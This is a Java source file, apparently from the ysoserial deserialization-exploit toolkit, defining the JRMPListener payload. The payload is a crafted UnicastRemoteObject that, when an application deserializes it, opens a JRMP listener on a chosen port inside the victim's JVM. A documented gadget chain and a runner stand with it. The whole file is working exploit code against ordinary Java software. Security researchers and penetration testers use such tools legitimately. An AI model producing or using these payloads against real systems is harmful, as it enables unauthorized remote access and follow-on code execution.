package ysoserial.payloads;


import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;

import sun.rmi.server.ActivationGroupImpl;
import sun.rmi.server.UnicastServerRef;
import sun.rmi.transport.ObjectTable;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * Gadget chain:
 * UnicastRemoteObject.readObject(ObjectInputStream) line: 235
 * UnicastRemoteObject.reexport() line: 266
 * UnicastRemoteObject.exportObject(Remote, int) line: 320
 * UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383
 * UnicastServerRef.exportObject(Remote, Object, boolean) line: 208
 * LiveRef.exportObject(Target) line: 147
 * TCPEndpoint.exportObject(Target) line: 411
 * TCPTransport.exportObject(Target) line: 249
 * TCPTransport.listen() line: 319
 *
 * Requires:
 * - JavaSE
 *
 * Argument:
 * - Port number to open listener to
 */
@SuppressWarnings ( {
    "restriction"
} )
@PayloadTest(harness="ysoserial.test.payloads.JRMPListenerTest")
@Authors({ Authors.MBECHLER })
public class JRMPListener extends PayloadRunner implements ObjectPayload<UnicastRemoteObject>, PostDeserializeReleasable<UnicastRemoteObject> {

    public UnicastRemoteObject getObject ( final String command ) throws Exception {
        int jrmpPort = Integer.parseInt(command);
        UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[] {
            RemoteRef.class
        }, new Object[] {
            new UnicastServerRef(jrmpPort)
        });

        Reflections.getField(UnicastRemoteObject.class, "port").set(uro, jrmpPort);
        return uro;
    }

    @Override
    public void postDeserializeRelease(UnicastRemoteObject obj) throws Exception {
        // unexport ref to allow listener thread (and jvm) to exit
        ObjectTable.unexportObject(obj, true);
    }

    public static void main ( final String[] args ) throws Exception {
        UnicastRemoteObject uro = PayloadRunner.run(JRMPListener.class, new String[] { "44444" });
    }
}
